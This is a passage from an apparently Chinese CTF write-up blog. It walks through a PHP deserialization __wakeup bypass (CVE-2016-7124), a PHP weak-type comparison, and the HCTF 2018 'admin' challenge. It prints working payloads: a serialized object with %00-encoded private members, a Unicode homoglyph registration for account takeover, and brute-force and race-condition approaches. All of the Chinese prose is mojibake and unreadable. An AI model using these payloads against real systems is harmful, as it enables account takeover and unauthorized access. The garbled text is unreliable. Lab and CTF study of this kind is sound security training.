class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>åœ¨<code>__destruct</code>å‡½æ•°ä¸­ï¼Œå½“ä¼ å…¥çš„ç”¨æˆ·åä¸º<code>admin</code>ä¼šè¾“å‡º<code>flag</code>ï¼Œä½†æ˜¯åœ¨<code>__wakeup</code>å‡½æ•°ä¸­ï¼Œç”¨æˆ·åè¢«èµ‹å€¼ä¸º<code>guest</code>ã€‚æˆ‘ä»¬çŸ¥é“<code>__wakeup</code>æ˜¯åœ¨ååºåˆ—åŒ–çš„æœ€å¼€å§‹è°ƒç”¨çš„ï¼Œéœ€è¦å»æ‰¾ä¸ªç»•è¿‡æ–¹æ³•ã€‚</p>

        <h2 id="2-ç»•è¿‡-wakeup"   >
          <a href="#2-ç»•è¿‡-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡-wakeup" class="headerlink" title="2.ç»•è¿‡__wakeup"></a>2.ç»•è¿‡<code>__wakeup</code></h2>
      <p>åˆ©ç”¨<code>CVE-2016-7124</code>ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></div></figure>

<p>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œæˆå‘˜ä¸ªæ•°çš„å€¼å¤§äºå®é™…æˆå‘˜ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡<code>__wakeup</code>å‡½æ•°çš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ä½¿å¾—ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æˆå‘˜ä¸ªæ•°å¤§äºå®é™…çš„æˆå‘˜ä¸ªæ•°ã€‚å¦‚ä¸‹ï¼Œå°†<code>Name</code>è¿™ä¸ªå¯¹è±¡å¯¹åº”çš„æˆå‘˜ä¸ªæ•°ç”±åŸæœ¬çš„2æ”¹ä¸º3å³å¯ç»•è¿‡ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://paper.seebug.org/866/#php_2" >PHP å†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´ (seebug.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="å°æŠ€å·§"   >
          <a href="#å°æŠ€å·§" class="heading-link"><i class="fas fa-link"></i></a><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3>
      <p>å¯¹äºå®é™…æ·»åŠ æˆå‘˜çš„å±æ€§ä¹Ÿèƒ½ä»ä¸€ç§ç¨‹åº¦ä¸Šç»•è¿‡<code>__wakeup</code>ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        print_r(<span class="string">&quot;calling __toString\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        print_r(<span class="string">&quot;calling __wakeup\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$myStr</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line">print_r(<span class="variable">$myStr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$objStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;s:1:&quot;n&quot;:N;&#125;&#x27;;</span></span><br><span class="line"><span class="comment">//$originStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;&#125;&#x27;;</span></span><br><span class="line"><span class="comment">//unserialize($objStr);</span></span><br><span class="line"><span class="comment">//echo &quot;aa&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>å…ˆç”Ÿæˆä¸€ä¸‹åºåˆ—åŒ–é“¾å­ï¼Œå¾—åˆ°<code>$originStr</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$originStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;&#125;&#x27;;</span><br><span class="line">//æ·»åŠ ä¸€ä¸ªå±æ€§ `s:1:&quot;n&quot;:N;`å¾—åˆ°å¦‚ä¸‹$objStr</span><br><span class="line">$objStr = &#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:0:&#123;&#125;s:1:&quot;n&quot;:N;&#125;&#x27;;</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œå‘ç°å…ˆ<code>__toString</code>ï¼Œå†è°ƒç”¨<code>__wakeup</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize($objStr);</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·ä¹Ÿä»£è¡¨ä»å¦ä¸€ç§æ–¹å¼ç»•è¿‡<code>__wakeup</code>å‡½æ•°äº†ã€‚</p>
<p>æ­¤å¤–æ›¿æ¢<code>s:1:&quot;n&quot;:N;</code>ä¸º<code>;</code>å…¶å®ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨<code>php8</code>ç‰ˆæœ¬ä¸‹ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æŸä¸ª<code>CVE</code>ï¼Œ</p>

        <h2 id="3-privateæˆå‘˜"   >
          <a href="#3-privateæˆå‘˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-privateæˆå‘˜" class="headerlink" title="3.privateæˆå‘˜"></a>3.privateæˆå‘˜</h2>
      <p>åºåˆ—åŒ–æ—¶</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cookie</span> = <span class="string">&#x27;cookie&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$cookie</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie = <span class="variable">$cookie</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>, <span class="number">100</span>,<span class="string">&quot;cookie&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>ä¸åŒç±»å‹çš„æˆå‘˜åºåˆ—åŒ–ä¹‹åæˆå‘˜å˜é‡åä¿å­˜çš„å½¢å¼ä¸å¤ªä¸€æ ·</p>
<ul>
<li><p>private</p>
<p>å˜ä¸º<code>\x00$password\00</code></p>
</li>
<li><p>public</p>
<p>ä»ç„¶ä¸ºåŸå§‹çš„ï¼Œå³<code>username</code></p>
</li>
<li><p>protected</p>
<p>å˜ä¸º<code>\00*\00cookie</code></p>
</li>
</ul>
<p>æ‰€ä»¥åœ¨ä¼ å…¥ååºåˆ—å­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦è€ƒè™‘åˆ°è¿™äº›ç‰¹ç‚¹ï¼Œè¿™é‡Œå¯¹åº”<code>private</code>æˆå‘˜å°±éœ€è¦ä¼ å…¥<code>URL</code>ç¼–ç çš„<code>\x00</code>å³<code>%00</code></p>

        <h2 id="4-æœ€ç»ˆpayload"   >
          <a href="#4-æœ€ç»ˆpayload" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æœ€ç»ˆpayload" class="headerlink" title="4.æœ€ç»ˆpayload"></a>4.æœ€ç»ˆpayload</h2>
      <p>ä¿®æ”¹æˆå‘˜æ•°é‡ç»•è¿‡<code>__wakeup</code>ï¼ŒåŠ å…¥<code>%00</code>è¡¨ç¤º<code>private</code>æˆå‘˜</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></div></figure>


        <h1 id="åä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile"   >
          <a href="#åä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="åä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>åä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1>
      
        <h2 id="ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½"   >
          <a href="#ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½" class="headerlink" title="ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½"></a>ğŸ”ºPHPå¼±ç±»å‹æ¯”è¾ƒã€ç½‘ç«™æºç å¤‡ä»½</h2>
      <p>é¦–å…ˆè·å–å¤‡ä»½æºç <code>url/index.php.bak</code>ï¼Œæ‰«ä¸€ä¸‹ä¹Ÿå¯ä»¥</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>çœ‹åˆ°å½“ä¼ å…¥çš„<code>key</code>ç­‰äº<code>str</code>æ—¶ä¼šæ‰“å°<code>flag</code>ï¼Œä½†æ˜¯åˆä¸èƒ½ä¼ å­—ç¬¦ï¼Œè¿™é‡Œå°±ç”¨åˆ°å¼±ç±»å‹æ¯”è¾ƒ</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="number">123</span>;</span><br><span class="line"><span class="variable">$abc</span> = <span class="string">&quot;123aaaa&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$abc</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>ä¸Šè¿°ä»£ç ä¼šè¾“å‡º<code>bbbb</code>ï¼ŒåŸå› å°±æ˜¯å½“<code>==</code>æ¯”è¾ƒå¯¹è±¡ä¸­ä»»æ„ä¸€ä¸ªä¸ºæ•°å­—ï¼Œå°±ä¼šæŠŠå¦ä¸€ä¸ªæ¯”è¾ƒå¯¹è±¡ä¹Ÿå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ï¼Œå¯¹äºå­—ç¬¦ä¸²å‹çš„å¼ºåˆ¶è½¬æ¢ï¼Œä¼šä»å·¦å¼€å§‹éå†ï¼Œç›´åˆ°ç¢°åˆ°éæ•°å­—çš„éƒ¨åˆ†ï¼Œä¸¢å¼ƒä¹‹åçš„éƒ¨åˆ†ï¼Œè½¬æ¢ä¸ºæ•°å­—ï¼Œæ‰€ä»¥æ¡ä»¶æˆç«‹ã€‚</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$abc</span> = <span class="string">&quot;123aaaa333&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$abc</span>);</span><br></pre></td></tr></table></div></figure>

<p>ä¸Šè¿°ä»£ç ä¼šè¾“å‡º<code>123</code>ï¼Œ</p>
<p>é‚£ä¹ˆä¼ å…¥<code>key=123</code>å³å¯ã€‚</p>

        <h1 id="åå…«ã€-HCTF-2018-admin"   >
          <a href="#åå…«ã€-HCTF-2018-admin" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå…«ã€-HCTF-2018-admin" class="headerlink" title="åå…«ã€[HCTF 2018]admin"></a>åå…«ã€[HCTF 2018]admin</h1>
      
        <h2 id="ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€"   >
          <a href="#ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€" class="headerlink" title="ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€"></a>ğŸ”ºçˆ†ç ´ã€æ¨¡æ¿åº“å‡½æ•°ã€</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086#h3-6" >ä¸€é¢˜ä¸‰è§£ä¹‹2018HCTF&amp;admin - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æç¤º<code>admin</code>ï¼Œæœ‰ç™»å½•æ³¨å†Œç•Œé¢ï¼Œæ³¨å†Œç•Œé¢æ³¨å†Œ<code>admin</code>å¤±è´¥ï¼Œåº”è¯¥æœ‰è¯¥ç”¨æˆ·ã€‚é‚£ä¹ˆç›´æ¥å°è¯•<code>Burpsuite</code>å¼±å¯†ç çˆ†ç ´ã€‚BUUå¹³å°å‘åŒ…éœ€è¦æ…¢ä¸€ç‚¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220711121051309.png" alt="image-20220711121051309"></p>
<p>çˆ†å‡ºæ¥123ï¼Œç™»å½•å¾—<code>flag</code>ã€‚è¿™ä¸ç®—ä»€ä¹ˆè§£æ³•ï¼Œå°±è®°å½•ä¸€ä¸‹ã€‚</p>

        <h2 id="1-è§£æ³•ä¸€"   >
          <a href="#1-è§£æ³•ä¸€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è§£æ³•ä¸€" class="headerlink" title="1.è§£æ³•ä¸€"></a>1.è§£æ³•ä¸€</h2>
      <p><code>python</code>çš„<code>flask</code>æ¨¡æ¿åº“<code>Twisted</code>ä¸­çš„å‡½æ•°é—®é¢˜</p>
<p>åœ¨ä¿®æ”¹å¯†ç çš„é¡µé¢æºä»£ç æœ‰æç¤ºï¼Œè¯¥ç½‘ç«™ä½¿ç”¨çš„ä¸º<code>python</code>çš„<code>flash</code>æ¨¡æ¿ï¼Œç»™äº†ç›¸å…³ç½‘å€ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask" >woadsl1234/hctf_flask: hctf_flask (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œå…¶ä¸­çš„å„ä¸ªåŒ…ç‰ˆæœ¬</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220712144242517.png" alt="image-20220712144242517"></p>
<ul>
<li><p>æŸ¥æ‰¾<code>flask</code>çš„è·¯ç”±<code>routes.py</code>ï¼Œæ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹å¯†ç çš„ç›¸å…³å‡½æ•°ï¼Œä½¿ç”¨çš„éƒ½æ˜¯<code>strlower</code>å‡½æ•°</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></div></figure>

<p>æ¥å°†ç”¨æˆ·åè¿›è¡Œå°å†™åŒ–ï¼Œè€Œ<code>nodeprep</code>ä½äºåŒ…<code>Twisted==10.2.0</code></p>
</li>
<li><p>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„åŒ…ï¼Œè·Ÿè¿›æŸ¥çœ‹å‡½æ•°</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nodeprep = Profile(mappings=[B_1, B_2],</span><br><span class="line">                   prohibiteds=[C_11, C_12, C_21, C_22,</span><br><span class="line">                                C_3, C_4, C_5, C_6, C_7, C_8, C_9,</span><br><span class="line">                                LookupTable([<span class="string">u&#x27;&quot;&#x27;</span>, <span class="string">u&#x27;&amp;&#x27;</span>, <span class="string">u&quot;&#x27;&quot;</span>, <span class="string">u&#x27;/&#x27;</span>,</span><br><span class="line">                                             <span class="string">u&#x27;:&#x27;</span>, <span class="string">u&#x27;&lt;&#x27;</span>, <span class="string">u&#x27;&gt;&#x27;</span>, <span class="string">u&#x27;@&#x27;</span>])])</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ç›¸å…³çš„<code>unicode</code>ç¼–ç ï¼Œç›¸å…³ç¼–ç å¯æŸ¥ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://unicode-table.com/en/blocks/" >Unicode - Unicode Character Table (unicode-table.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>åˆ¶å®šäº†ç›¸å…³è¡¨æ ¼ç´¢å¼•ï¼Œä¸çŸ¥é“æ˜¯æ€ä¹ˆåˆ¶å®šçš„ï¼Œåº”è¯¥æ˜¯å­—å…¸å•¥çš„æŠŠï¼Œæ¯”å¦‚ç»è¿‡<code>nodeprep.prepare</code>ä¹‹å</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u&#x27;\u0041&#x27;  ----&gt;   u&#x27;\u0061&#x27;</span><br><span class="line">A          ----&gt;   a</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡åœ¨è¯¥é¢˜çš„ç‰ˆæœ¬ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>Twisted==10.2.0</code>ï¼Œå…¶å†…éƒ¨ä»£ç å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u&#x27;\u1d2c&#x27;  ----&gt;   u&#x27;\u0041&#x27;</span><br><span class="line">á´¬          ----&gt;   A</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´å¦‚ä¸‹æƒ…å†µ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strlower(&#x27;á´¬&#x27;)=A</span><br><span class="line">strlower(&#x27;A&#x27;)=a</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ç°åœ¨æœ€æ–°ç‰ˆæœ¬çš„<code>Twisted</code>å·²ç»æ²¡äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
</li>
<li><p>ä¾æ®è¿™æ ·ï¼Œæ³¨å†Œçš„æ—¶å€™ä½¿ç”¨<code>á´¬dmin</code>ï¼Œå˜æˆäº†ç”¨æˆ·<code>Admin</code>ã€‚ç„¶åç™»å½•<code>Admin</code>ï¼Œä¿®æ”¹å¯†ç ï¼Œå˜æˆäº†ä¿®æ”¹<code>admin</code>çš„å¯†ç ï¼Œå³å¯å¾—åˆ°<code>admin</code>è´¦æˆ·ã€‚</p>
</li>
</ul>

        <h2 id="2-è§£æ³•äºŒ"   >
          <a href="#2-è§£æ³•äºŒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£æ³•äºŒ" class="headerlink" title="2.è§£æ³•äºŒ"></a>2.è§£æ³•äºŒ</h2>
      <p>åˆ©ç”¨<code>flask</code>æ¨¡æ¿å­˜åœ¨äºå®¢æˆ·ç«¯çš„ç¼ºé™·ï¼Œä¼ªé€ <code>session</code>ï¼Œç‰ˆæœ¬å®‰è£…è€å¤±è´¥ï¼Œæ”¾å¼ƒ</p>

        <h2 id="3-è§£æ³•ä¸‰"   >
          <a href="#3-è§£æ³•ä¸‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è§£æ³•ä¸‰" class="headerlink" title="3.è§£æ³•ä¸‰"></a>3.è§£æ³•ä¸‰</h2>
      <p>æ¡ä»¶ç«äº‰ï¼Œå°±æ˜¯åœ¨æ”¹å¯†ç çš„æ—¶å€™ä¸­æ–­ï¼Œç„¶ååˆ©ç”¨ç™»å½•åŠŸèƒ½ï¼Œå°è¯•ç™»å½•<code>admin</code>ï¼Œå°†å½“å‰çš„<code>session[&#39;name&#39;]</code>æ”¹ä¸º<code>admin</code>ï¼Œä¹‹åå†å›åˆ°æ”¹å¯†ç çš„åœ°æ–¹ï¼Œå°†<code>admin</code>çš„å¯†ç æ”¹æ‰ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220713111008888.png" alt="image-20220713111008888"></p>
<p>æŒ‰ç†è¯´å†ç™»å½•çš„æ—¶å€™ï¼Œåº”è¯¥å…ˆæŸ¥æœ‰æ²¡æœ‰è¯¥ç”¨æˆ·çš„ï¼Œç™»å½•ä¹‹åå†è¿›è¡Œ<code>session[&#39;name&#39;]</code>çš„èµ‹å€¼è¿™é‡Œå°±æ˜¯åˆ©ç”¨äº†å…ˆèµ‹å€¼<code>session[&#39;name&#39;]</code>çš„æ¼æ´ã€‚</p>

        <h1 id="åä¹ã€-BJDCTF2020-Easy-MD5"   >
          <a href="#åä¹ã€-BJDCTF2020-Easy-MD5" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¹ã€-BJDCTF2020-Easy-MD5" class="headerlink" title="åä¹ã€[BJDCTF2020]Easy MD5"></a>åä¹ã€[BJDCTF2020]Easy MD5</h1>
      <p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12535534.html" >BUUOJè®°å½•] [BJDCTF2020]Easy MD5 - Yeâ€™sBlog - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ğŸ”ºMD5-SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡"   >
          <a href="#ğŸ”ºMD5-SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºMD5-SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡" class="headerlink" title="ğŸ”ºMD5+SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡"></a>ğŸ”ºMD5+SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡</h2>
      
        <h2 id="1-MD5å®ç°SQLæ³¨å…¥"   >
